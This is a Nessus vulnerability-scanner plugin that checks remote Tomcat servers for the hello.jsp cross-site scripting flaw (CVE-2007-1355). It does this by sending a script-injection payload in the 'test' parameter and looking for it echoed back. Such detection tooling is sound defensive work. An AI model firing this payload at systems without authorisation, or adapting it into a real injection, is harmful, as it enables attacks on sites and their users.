#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25289);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-1355");
  script_bugtraq_id(24058);
  script_xref(name:"OSVDB", value:"34875");

  script_name(english:"Tomcat Sample App hello.jsp test Parameter XSS");
  script_summary(english:"Checks for an XSS flaw in a sample app from Tomcat");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP application that is vulnerable to
a cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server includes an example JSP application that fails
to sanitize user-supplied input before using it to generate dynamic
content in an error page.  An unauthenticated remote attacker may be
able to leverage this issue to inject arbitrary HTML or script code
into a user's browser to be executed within the security context of
the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/469067/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Undeploy the Tomcat documentation web application." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default: 8080);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Tomcat.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Apache-Coyote" >!< banner) exit(0);
}


# Send a request to exploit the flaw.
xss = raw_string("<script>alert(", SCRIPT_NAME, ")</script>");
exploit = string("test=", xss);
w = http_send_recv3(method:"GET", 
  item:string("/tomcat-docs/appdev/sample/web/hello.jsp?", exploit), 
  port:port  
);
if (isnull(w)) exit(1, "the web server did not answer");
res = w[2];

if (
  "<title>Sample Application JSP Page</title>" >< res &&
  ">Query String:<" >< res
)
{
  # There's a problem if our exploit appears in the query string; eg,
  #   <tr>
  #     <th align="right">Query String:</th>
  #     <td align="left">nessus=<script>alert(tomcat_sample_hello_xss.nasl)</script></td>
  #   </tr>
  qstr = strstr(res, ">Query String:<");
  qstr = qstr - strstr(qstr, "</tr>");
  qstr = strstr(qstr, "<td");
  qstr = qstr - strstr(qstr, "</td>");
  # nb: qstr includes some extra markup.
  if (string(">", exploit) >< qstr)
  {
   security_warning(port);
   set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
}
